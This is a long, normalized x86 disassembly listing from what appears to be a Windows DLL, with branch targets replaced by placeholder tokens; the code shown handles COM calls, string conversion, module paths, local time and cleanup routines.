push edi
sar eax 0x1
push eax
push edx
lea ecx [ ebx + 0x78 ]
call sub_100531b0
mov ecx [ ebp - 0xc0 ]
push ecx
call [ SysFreeString@IAT ]
mov eax [ ebp - 0xbc ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov eax [ ebx + 0x88 ]
push r--data
xor edi edi
lea ecx [ ebx + 0x78 ]
call sub_10039b60
test eax eax
jne r-xdata
lea edx [ ebp - 0x88 ]
mov eax 0x23
call sub_100050e0
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0xbc ]
push edx
lea edx [ ebp - 0x88 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
lea eax [ edi + 0x2 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xbc ]
mov ecx [ eax ]
lea edx [ ebp - 0xc0 ]
push edx
push eax
mov eax [ ecx + 0x68 ]
call eax
mov edx [ ebp - 0xc0 ]
mov eax edx
lea esi [ eax + 0x2 ]
lea ecx [ ecx ]
pop edi
pop esi
mov eax 0x3
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax esi
sar eax 0x1
push eax
push edx
lea ecx [ ebx + 0x94 ]
call sub_100531b0
mov ecx [ ebp - 0xc0 ]
mov edi [ SysFreeString@IAT ]
push ecx
call edi
mov eax [ ebp - 0xbc ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
lea edx [ ebp - 0xb8 ]
mov eax 0x131
call sub_100050e0
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0xbc ]
push edx
lea edx [ ebp - 0xb8 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ ebp - 0xbc ]
mov ecx [ eax ]
lea edx [ ebp - 0xc0 ]
push edx
push eax
mov eax [ ecx + 0x68 ]
call eax
mov edx [ ebp - 0xc0 ]
lea esi [ ebx + 0xb0 ]
push esi
call sub_1005eea0
mov ecx [ ebp - 0xc0 ]
push ecx
call edi
mov eax [ ebp - 0xbc ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov eax [ esi + 0x10 ]
push r--data
xor edi edi
mov ecx esi
call sub_10039b60
test eax eax
jne r-xdata
pop edi
pop esi
mov eax 0x5
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x5c ]
mov eax 0xdc
call sub_100050e0
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0xbc ]
push edx
lea edx [ ebp - 0x5c ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
lea eax [ edi + 0x6 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xbc ]
mov ecx [ eax ]
lea edx [ ebp - 0xc0 ]
push edx
push eax
mov eax [ ecx + 0x68 ]
call eax
mov edx [ ebp - 0xc0 ]
add ebx 0xcc
push ebx
call sub_1005eea0
mov ecx [ ebp - 0xc0 ]
push ecx
call [ SysFreeString@IAT ]
mov eax [ ebp - 0xbc ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov esi r--data
mov ecx ebx
call sub_1005ee60
mov ecx [ ebp - 0x4 ]
movzx eax al
neg eax
pop edi
sbb eax eax
pop esi
xor ecx ebp
and eax 0x8
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn
pop edi
pop esi
mov eax 0x7
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_1003dd40
push ebp
mov ebp esp
push 0xffffffff
push sub_1008331d
mov eax [ fs : 0x0 ]
push eax
sub esp 0x92c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor edi edi
mov esi ecx
mov [ ebp - 0x92c ] esi
mov [ ebp - 0x8e0 ] edi
mov [ ebp - 0x8dc ] edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x918 ] edi
mov [ ebp - 0x914 ] edi
mov [ ebp - 0x8e8 ] edi
mov [ ebp - 0x8e4 ] edi
mov [ ebp - 0x908 ] edi
mov [ ebp - 0x904 ] edi
mov [ ebp - 0x8f8 ] edi
mov [ ebp - 0x8f4 ] edi
mov [ ebp - 0x900 ] edi
mov [ ebp - 0x8fc ] edi
mov [ ebp - 0x8f0 ] edi
mov [ ebp - 0x8ec ] edi
mov [ ebp - 0x8d8 ] edi
mov [ ebp - 0x8d4 ] edi
mov [ ebp - 0x920 ] edi
mov [ ebp - 0x91c ] edi
mov [ ebp - 0x910 ] edi
mov [ ebp - 0x90c ] edi
mov [ ebp - 0x928 ] edi
mov [ ebp - 0x924 ] edi
mov [ ebp - 0x4 ] 0xa
cmp esi edi
jne r-xdata
lea edx [ ebp - 0x104 ]
mov eax 0x15
call sub_10013830
push esi
lea edx [ ebp - 0x8e0 ]
lea ecx [ ebp - 0x104 ]
call sub_1005a590
test eax eax
je r-xdata
lea esi [ ebp - 0x928 ]
call sub_10005940
lea esi [ ebp - 0x910 ]
call sub_10005940
lea esi [ ebp - 0x920 ]
call sub_10005940
lea esi [ ebp - 0x8d8 ]
call sub_10005940
lea esi [ ebp - 0x8f0 ]
call sub_10005940
lea esi [ ebp - 0x900 ]
call sub_10005940
lea esi [ ebp - 0x8f8 ]
call sub_10005940
lea esi [ ebp - 0x908 ]
call sub_10005940
lea esi [ ebp - 0x8e8 ]
call sub_10005940
lea esi [ ebp - 0x918 ]
call sub_10005940
lea esi [ ebp - 0x8e0 ]
call sub_10005940
lea eax [ edi + 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x8e0 ]
mov ecx [ eax ]
push ecx
call [ StrToIntW@IAT ]
mov [ rw-data ] eax
lea edx [ ebp - 0x1b8 ]
mov eax 0xb
call sub_10013830
push esi
lea edx [ ebp - 0x918 ]
lea ecx [ ebp - 0x1b8 ]
call sub_1005a590
test eax eax
je r-xdata
lea esi [ ebp - 0x928 ]
call sub_10005940
lea esi [ ebp - 0x910 ]
call sub_10005940
lea esi [ ebp - 0x920 ]
call sub_10005940
lea esi [ ebp - 0x8d8 ]
call sub_10005940
lea esi [ ebp - 0x8f0 ]
call sub_10005940
lea esi [ ebp - 0x900 ]
call sub_10005940
lea esi [ ebp - 0x8f8 ]
call sub_10005940
lea esi [ ebp - 0x908 ]
call sub_10005940
lea esi [ ebp - 0x8e8 ]
call sub_10005940
lea esi [ ebp - 0x918 ]
call sub_10005940
lea esi [ ebp - 0x8e0 ]
call sub_10005940
mov eax 0x2
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x918 ]
mov esi [ edx ]
mov eax rw-data
xor ebx ebx
mov edx 0x104
sub esi eax
lea esi [ ebp - 0x928 ]
call sub_10005940
lea esi [ ebp - 0x910 ]
call sub_10005940
lea esi [ ebp - 0x920 ]
call sub_10005940
lea esi [ ebp - 0x8d8 ]
call sub_10005940
lea esi [ ebp - 0x8f0 ]
call sub_10005940
lea esi [ ebp - 0x900 ]
call sub_10005940
lea esi [ ebp - 0x8f8 ]
call sub_10005940
lea esi [ ebp - 0x908 ]
call sub_10005940
lea esi [ ebp - 0x8e8 ]
call sub_10005940
lea esi [ ebp - 0x918 ]
call sub_10005940
lea esi [ ebp - 0x8e0 ]
call sub_10005940
mov eax 0x3
jmp r-xdata
cmp edx edi
jne r-xdata
movzx ecx [ esi + eax ]
cmp cx di
je r-xdata
xor edx edx
mov [ eax ] dx
cmp ebx edi
jge r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea edx [ ebp - 0x144 ]
mov eax 0x6d
call sub_10013830
mov eax [ ebp - 0x92c ]
push eax
lea edx [ ebp - 0x8e8 ]
lea ecx [ ebp - 0x144 ]
call sub_1005a590
test eax eax
je r-xdata
lea esi [ ebp - 0x928 ]
call sub_10005940
lea esi [ ebp - 0x910 ]
call sub_10005940
lea esi [ ebp - 0x920 ]
call sub_10005940
lea esi [ ebp - 0x8d8 ]
call sub_10005940
lea esi [ ebp - 0x8f0 ]
call sub_10005940
lea esi [ ebp - 0x900 ]
call sub_10005940
lea esi [ ebp - 0x8f8 ]
call sub_10005940
lea esi [ ebp - 0x908 ]
call sub_10005940
lea esi [ ebp - 0x8e8 ]
call sub_10005940
lea esi [ ebp - 0x918 ]
call sub_10005940
lea esi [ ebp - 0x8e0 ]
call sub_10005940
mov eax 0x4
jmp r-xdata
lea ecx [ edx + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x8e8 ]
mov esi [ ecx ]
mov eax rw-data
xor ebx ebx
mov edx 0x104
sub esi eax
lea esi [ ebp - 0x928 ]
call sub_10005940
lea esi [ ebp - 0x910 ]
call sub_10005940
lea esi [ ebp - 0x920 ]
call sub_10005940
lea esi [ ebp - 0x8d8 ]
call sub_10005940
lea esi [ ebp - 0x8f0 ]
call sub_10005940
lea esi [ ebp - 0x900 ]
call sub_10005940
lea esi [ ebp - 0x8f8 ]
call sub_10005940
lea esi [ ebp - 0x908 ]
call sub_10005940
lea esi [ ebp - 0x8e8 ]
call sub_10005940
lea esi [ ebp - 0x918 ]
call sub_10005940
lea esi [ ebp - 0x8e0 ]
call sub_10005940
mov eax 0x5
jmp r-xdata
cmp edx edi
jne r-xdata
movzx ecx [ esi + eax ]
cmp cx di
je r-xdata
xor edx edx
mov [ eax ] dx
cmp ebx edi
jge r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea edx [ ebp - 0x18c ]
mov eax 0x150
call sub_10013830
mov eax [ ebp - 0x92c ]
push eax
lea edx [ ebp - 0x908 ]
lea ecx [ ebp - 0x18c ]
call sub_1005a590
test eax eax
je r-xdata
lea esi [ ebp - 0x928 ]
call sub_10005940
lea esi [ ebp - 0x910 ]
call sub_10005940
lea esi [ ebp - 0x920 ]
call sub_10005940
lea esi [ ebp - 0x8d8 ]
call sub_10005940
lea esi [ ebp - 0x8f0 ]
call sub_10005940
lea esi [ ebp - 0x900 ]
call sub_10005940
lea esi [ ebp - 0x8f8 ]
call sub_10005940
lea esi [ ebp - 0x908 ]
call sub_10005940
lea esi [ ebp - 0x8e8 ]
call sub_10005940
lea esi [ ebp - 0x918 ]
call sub_10005940
lea esi [ ebp - 0x8e0 ]
call sub_10005940
mov eax 0x6
jmp r-xdata
lea ecx [ edx + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x908 ]
mov esi [ ecx ]
mov eax rw-data
xor ebx ebx
mov edx 0x104
sub esi eax
lea esi [ ebp - 0x928 ]
call sub_10005940
lea esi [ ebp - 0x910 ]
call sub_10005940
lea esi [ ebp - 0x920 ]
call sub_10005940
lea esi [ ebp - 0x8d8 ]
call sub_10005940
lea esi [ ebp - 0x8f0 ]
call sub_10005940
lea esi [ ebp - 0x900 ]
call sub_10005940
lea esi [ ebp - 0x8f8 ]
call sub_10005940
lea esi [ ebp - 0x908 ]
call sub_10005940
lea esi [ ebp - 0x8e8 ]
call sub_10005940
lea esi [ ebp - 0x918 ]
call sub_10005940
lea esi [ ebp - 0x8e0 ]
call sub_10005940
mov eax 0x7
jmp r-xdata
cmp edx edi
jne r-xdata
movzx ecx [ esi + eax ]
cmp cx di
je r-xdata
xor edx edx
mov [ eax ] dx
cmp ebx edi
jge r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea edx [ ebp - 0x124 ]
mov eax 0x14b
call sub_10013830
mov ebx [ ebp - 0x92c ]
push ebx
lea edx [ ebp - 0x8f8 ]
lea ecx [ ebp - 0x124 ]
call sub_1005a590
test eax eax
jne r-xdata
lea esi [ ebp - 0x928 ]
call sub_10005940
lea esi [ ebp - 0x910 ]
call sub_10005940
lea esi [ ebp - 0x920 ]
call sub_10005940
lea esi [ ebp - 0x8d8 ]
call sub_10005940
lea esi [ ebp - 0x8f0 ]
call sub_10005940
lea esi [ ebp - 0x900 ]
call sub_10005940
lea esi [ ebp - 0x8f8 ]
call sub_10005940
lea esi [ ebp - 0x908 ]
call sub_10005940
lea esi [ ebp - 0x8e8 ]
call sub_10005940
lea esi [ ebp - 0x918 ]
call sub_10005940
lea esi [ ebp - 0x8e0 ]
call sub_10005940
mov eax 0x8
jmp r-xdata
lea ecx [ edx + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax 0xa0
call sub_10013830
push ebx
lea edx [ ebp - 0x900 ]
lea ecx [ ebp - 0x3c ]
call sub_1005a590
test eax eax
jne r-xdata
mov eax [ ebp - 0x8f8 ]
mov ecx [ eax ]
push ecx
call sub_1002cad7
add esp 0x4
mov [ rw-data ] eax
mov [ rw-data ] edx
lea edx [ ebp - 0xcc ]
mov eax 0x37
call sub_10013830
push ebx
lea edx [ ebp - 0x8f0 ]
lea ecx [ ebp - 0xcc ]
call sub_1005a590
test eax eax
jne r-xdata
mov edx [ ebp - 0x900 ]
mov esi [ edx ]
mov eax rw-data
mov edx 0x104
sub esi eax
lea esp [ esp ]
lea edx [ ebp - 0xe8 ]
mov eax 0xba
call sub_10013830
push ebx
lea edx [ ebp - 0x8d8 ]
lea ecx [ ebp - 0xe8 ]
call sub_1005a590
test eax eax
jne r-xdata
mov eax [ ebp - 0x8f0 ]
mov ecx [ eax ]
push ecx
call sub_10055686
add esp 0x4
mov [ rw-data ] eax
cmp edx edi
jne r-xdata
movzx ecx [ esi + eax ]
cmp cx di
je r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0x12e
call sub_10013830
push ebx
lea edx [ ebp - 0x920 ]
lea ecx [ ebp - 0x94 ]
call sub_1005a590
test eax eax
jne r-xdata
mov edx [ ebp - 0x8d8 ]
mov eax [ edx ]
push eax
call sub_10055686
add esp 0x4
mov [ rw-data ] eax
xor edx edx
mov [ eax ] dx
sub eax 0x2
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea edx [ ebp - 0xb0 ]
mov eax 0x156
call sub_10013830
push ebx
lea edx [ ebp - 0x910 ]
lea ecx [ ebp - 0xb0 ]
call sub_1005a590
test eax eax
jne r-xdata
mov ecx [ ebp - 0x920 ]
mov edx [ ecx ]
push edx
call sub_10032fc8
fstp [ rw-data ]
add esp 0x4
lea ecx [ edx + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
mov [ ebp - 0x938 ] edi
mov [ ebp - 0x934 ] edi
lea edx [ ebp - 0x64 ]
mov eax 0x12c
mov [ ebp - 0x4 ] 0xb
call sub_10013830
push ebx
lea edx [ ebp - 0x938 ]
lea ecx [ ebp - 0x64 ]
call sub_1005a590
test eax eax
jne r-xdata
mov eax [ ebp - 0x910 ]
mov ecx [ eax ]
push ecx
call sub_10032fc8
fstp [ rw-data ]
add esp 0x4
lea edx [ ebp - 0x8d0 ]
mov eax 0xb5
call sub_10013830
lea edx [ ebp - 0x7c ]
mov eax 0xf4
call sub_10013830
lea edx [ ebp - 0x168 ]
mov eax 0xd9
call sub_10013830
lea edx [ ebp - 0x28 ]
mov eax 0xb8
call sub_10013830
lea edx [ ebp - 0x1c ]
mov eax 0xf3
call sub_10013830
lea edx [ ebp - 0x50 ]
mov eax 0x5
call sub_10013830
lea edx [ ebp - 0x930 ]
mov eax 0x11
call sub_10013830
mov edi 0x7
xor ebx ebx
xor eax eax
mov [ ebp - 0x7d8 ] edi
mov [ ebp - 0x7dc ] ebx
mov [ ebp - 0x7ec ] ax
mov ecx [ ebp - 0x92c ]
push ecx
lea edx [ ebp - 0x928 ]
lea ecx [ ebp - 0x7c ]
mov [ ebp - 0x4 ] 0xc
call sub_1005a590
test eax eax
jne r-xdata
mov edx [ ebp - 0x938 ]
mov edx [ edx ]
push rw-data
call sub_1005eea0
jmp r-xdata
push 0xdc8
call sub_10055606
add esp 0x4
cmp eax ebx
je r-xdata
mov eax [ ebp - 0x928 ]
lea edx [ ebp - 0x7ec ]
push edx
mov edx [ eax ]
call sub_1005eea0
lea esi [ ebp - 0x938 ]
call sub_10005940
lea esi [ ebp - 0x928 ]
call sub_10005940
lea esi [ ebp - 0x910 ]
call sub_10005940
lea esi [ ebp - 0x920 ]
call sub_10005940
lea esi [ ebp - 0x8d8 ]
call sub_10005940
lea esi [ ebp - 0x8f0 ]
call sub_10005940
lea esi [ ebp - 0x900 ]
call sub_10005940
lea esi [ ebp - 0x8f8 ]
call sub_10005940
lea esi [ ebp - 0x908 ]
call sub_10005940
lea esi [ ebp - 0x8e8 ]
call sub_10005940
lea esi [ ebp - 0x918 ]
call sub_10005940
lea esi [ ebp - 0x8e0 ]
call sub_10005940
xor eax eax
push 0x104
lea ecx [ ebp - 0x3c0 ]
push ecx
push 0x0
call [ GetModuleFileNameW@IAT ]
lea edx [ ebp - 0x3c0 ]
push edx
call [ PathRemoveFileSpecW@IAT ]
cmp [ ebp - 0x7dc ] 0x0
jne r-xdata
push rw-data
mov esi eax
call sub_1000af60
mov ebx eax
xor ecx ecx
mov [ ebp - 0x7f4 ] edi
mov [ ebp - 0x7f8 ] 0x0
mov [ ebp - 0x808 ] cx
lea edx [ ebp - 0x8d0 ]
push edx
mov eax edx
push eax
mov ecx edx
push ecx
push 0x0
push 0x1
push ebx
lea eax [ ebp - 0x7d0 ]
mov [ ebp - 0x4 ] 0xd
call sub_1002ed80
test eax eax
jne r-xdata
lea eax [ ebp - 0x8d0 ]
push eax
mov ecx eax
push ecx
mov edx eax
push edx
push 0x0
push 0x1
push ebx
lea eax [ ebp - 0x5c8 ]
call sub_1002ed80
test eax eax
lea eax [ ebp - 0x7ec ]
push eax
jne r-xdata
lea eax [ ebp - 0x808 ]
push eax
lea edx [ ebp - 0x50 ]
call sub_1005eea0
lea edx [ ebp - 0x7d0 ]
push edx
lea ecx [ ebp - 0x824 ]
call sub_10012920
push eax
lea edx [ ebp - 0x1c ]
lea esi [ ebp - 0x840 ]
mov [ ebp - 0x4 ] 0xe
call sub_10030dc0
add esp 0x4
push eax
lea ecx [ ebp - 0x808 ]
mov [ ebp - 0x4 ] 0xf
call sub_10036380
mov ecx esi
call sub_10029c40
lea ecx [ ebp - 0x824 ]
mov [ ebp - 0x4 ] 0xd
call sub_10029c40
jmp r-xdata
lea edx [ ebp - 0x28 ]
call sub_1005eea0
lea edx [ ebp - 0x5c8 ]
call sub_1005eea0
mov eax [ ebp - 0x92c ]
lea ecx [ ebp - 0x5c8 ]
push ecx
lea edx [ ebp - 0x168 ]
push edx
call sub_100245b0
jmp r-xdata
mov edx edi
mov edx [ edi ]
jmp r-xdata
lea ecx [ ebp - 0x3c0 ]
push ecx
lea ecx [ ebp - 0x894 ]
call sub_10012920
push eax
lea edx [ ebp - 0x930 ]
lea esi [ ebp - 0x878 ]
mov [ ebp - 0x4 ] 0x10
call sub_10030dc0
add esp 0x4
mov ecx eax
lea eax [ ebp - 0x808 ]
lea esi [ ebp - 0x8b0 ]
mov [ ebp - 0x4 ] 0x11
call sub_10030aa0
mov edi eax
lea edx [ ebp - 0x3c0 ]
push edx
lea ecx [ ebp - 0x85c ]
mov [ ebp - 0x4 ] 0x12
call sub_10012920
push eax
lea edx [ ebp - 0x930 ]
lea esi [ ebp - 0x8cc ]
mov [ ebp - 0x4 ] 0x13
call sub_10030dc0
add esp 0x4
mov ecx eax
lea eax [ ebp - 0x7ec ]
lea esi [ ebp - 0x840 ]
mov [ ebp - 0x4 ] 0x14
call sub_10030aa0
mov ecx 0x8
mov [ ebp - 0x4 ] 0x15
cmp [ edi + 0x14 ] ecx
jb r-xdata
lea ecx [ ebp - 0x824 ]
push ecx
mov ecx eax
call sub_1000e0a0
add esp 0x4
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x16
call sub_10036380
lea ecx [ ebp - 0x824 ]
call sub_10029c40
lea ecx [ ebp - 0x840 ]
call sub_10029c40
lea ecx [ ebp - 0x8cc ]
call sub_10029c40
lea ecx [ ebp - 0x85c ]
call sub_10029c40
lea ecx [ ebp - 0x8b0 ]
call sub_10029c40
lea ecx [ ebp - 0x878 ]
call sub_10029c40
lea ecx [ ebp - 0x894 ]
call sub_10029c40
test ebx ebx
je r-xdata
mov eax [ eax ]
cmp [ eax + 0x14 ] ecx
jb r-xdata
lea ecx [ ebp - 0x808 ]
call sub_10029c40
lea ecx [ ebp - 0x7ec ]
call sub_10029c40
mov esi ebx
call sub_10013d50
push ebx
call sub_1006591f
add esp 0x4
sub_1003e97e
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x14 ]
push edi
push [ ebp + 0x1c ]
mov edi [ ebp + 0x8 ]
push eax
push r--data
lea eax [ ebp - 0xc ]
mov ebx ecx
push eax
push ebx
call sub_10037958
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_10010183
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_10015817
mov ecx [ ebp - 0x4 ]
add esp 0x30
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn 0x18
sub_1003e9ec
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push esi
mov esi [ ebp + 0x18 ]
push edi
mov edi [ ebp + 0x8 ]
add edi 0x8
movzx eax [ esi ]
push edi
push 0x0
push eax
call sub_1003088d
movzx eax ax
add esp 0xc
push eax
lea ecx [ ebp + 0x10 ]
call sub_10044159
dec [ ebp + 0x1c ]
inc esi
cmp [ ebp + 0x1c ] 0x0
ja r-xdata
pop edi
pop esi
sub_1003ea40
push ebp
mov ebp esp
push 0xffffffff
push sub_1008032b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0xc
call sub_10055606
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0x8 ]
push eax
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x1
call sub_1004d840
mov [ esi ] eax
jmp r-xdata
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push 0x8007000e
call sub_10008030
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebx ] esi
test esi esi
jne r-xdata
sub_1003ead0
push ebp
mov ebp esp
sub esp 0x50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
lea edx [ ebp - 0x48 ]
push edx
lea edx [ ebp - 0x4c ]
push edx
push eax
mov eax [ ecx + 0xc ]
call eax
mov [ esi ] eax
test eax eax
jns r-xdata
push 0x30
lea eax [ ebp - 0x44 ]
push 0x0
push eax
call sub_10079a10
add esp 0xc
lea ecx [ ebp - 0x14 ]
push ecx
call [ GetLocalTime@IAT ]
movzx eax [ ebp - 0x12 ]
mov cx [ ebp - 0x14 ]
mov dx [ ebp - 0xe ]
mov [ ebp - 0x40 ] cx
mov ecx [ ebp - 0xa ]
mov [ ebp - 0x3e ] ax
movzx eax [ ebp - 0xc ]
mov [ ebp - 0x3c ] dx
add ecx 0x2
mov [ ebp - 0x34 ] ax
mov eax [ ebp - 0x48 ]
mov [ ebp - 0x32 ] cx
mov edx 0x30
mov [ ebp - 0x44 ] dx
lea ecx [ ebp - 0x44 ]
mov [ ebp - 0x24 ] 0x7
mov edx [ eax ]
mov edx [ edx + 0xc ]
push ecx
push eax
call edx
mov [ esi ] eax
test eax eax
jns r-xdata
mov eax [ esi + 0x8 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x48 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
mov eax [ esi ]
sub_1003eba0
push ebx
push esi
mov esi ecx
mov [ esi ] r--data
cmp [ esi + 0xa8 ] 0x8
push edi
jb r-xdata
xor edi edi
mov ebx 0x7
xor ecx ecx
mov [ esi + 0xa8 ] ebx
mov [ esi + 0xa4 ] edi
mov [ esi + 0x94 ] cx
cmp [ esi + 0x8c ] 0x8
jb r-xdata
mov eax [ esi + 0x94 ]
push eax
call sub_1006591f
add esp 0x4
xor eax eax
mov [ esi + 0x8c ] ebx
mov [ esi + 0x88 ] edi
mov [ esi + 0x78 ] ax
cmp [ esi + 0x70 ] 0x8
jb r-xdata
mov edx [ esi + 0x78 ]
push edx
call sub_1006591f
add esp 0x4
xor edx edx
mov [ esi + 0x70 ] ebx
mov [ esi + 0x6c ] edi
mov [ esi + 0x5c ] dx
cmp [ esi + 0x54 ] 0x8
jb r-xdata
mov ecx [ esi + 0x5c ]
push ecx
call sub_1006591f
add esp 0x4
xor ecx ecx
mov [ esi + 0x54 ] ebx
mov [ esi + 0x50 ] edi
mov [ esi + 0x40 ] cx
cmp [ esi + 0x38 ] 0x8
jb r-xdata
mov eax [ esi + 0x40 ]
push eax
call sub_1006591f
add esp 0x4
xor eax eax
mov [ esi + 0x38 ] ebx
mov [ esi + 0x34 ] edi
mov [ esi + 0x24 ] ax
cmp [ esi + 0x18 ] 0x8
jb r-xdata
mov edx [ esi + 0x24 ]
push edx
call sub_1006591f
add esp 0x4
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] ebx
xor edx edx
pop edi
mov [ esi + 0x4 ] dx
pop esi
pop ebx
retn
mov ecx [ esi + 0x4 ]
push ecx
call sub_1006591f
add esp 0x4
sub_1003ec82
push 0x14
mov eax sub_1007f62c
call sub_100097c8
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100014b7
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10015f10
mov ecx [ ebp + 0x8 ]
push eax
call sub_10065660
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10050f50
mov eax edi
call sub_1004db01
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10052cd5
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10030d90
push edi
call sub_1004d80c
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1005457d
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1000bd19
sub_1003ed20
push ebp
mov ebp esp
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
sub esp 0x1c
test [ ecx + esi + 0xc ] 0x6
jne r-xdata
mov eax esi
mov esp ebp
pop ebp
retn 0xc
mov edx [ ebp + 0x10 ]
mov ecx [ ecx + esi + 0x38 ]
mov eax [ ecx ]
mov eax [ eax + 0x28 ]
push 0x1
push edx
mov edx [ ebp + 0xc ]
push edx
mov edx [ ebp + 0x8 ]
push edx
lea edx [ ebp - 0x1c ]
push edx
call eax
mov eax [ ebp - 0x14 ]
cdq
add eax [ ebp - 0x1c ]
adc edx [ ebp - 0x18 ]
cmp eax [ r--data ]
jne r-xdata
cmp edx [ r--data ]
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + esi + 0xc ]
add ecx esi
or eax 0x2
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
and eax 0x17
mov [ ecx + 0xc ] eax
test [ ecx + 0x10 ] eax
je r-xdata
or eax 0x4
push 0x0
call sub_1003c700
sub_1003ed9a
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
call sub_1002bd55
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
push eax
lea ecx [ esi + 0x14 ]
call sub_10055040
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax r--data
mov eax r--data
push [ ebp + 0xc ]
push 0x0
call sub_1002bd55
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
lea ecx [ esi + 0x1c ]
call sub_10055040
pop esi
pop ebp
retn
sub_1003edf0
push esi
mov esi ecx
cmp [ esi + 0xb8 ] 0x0
jne r-xdata
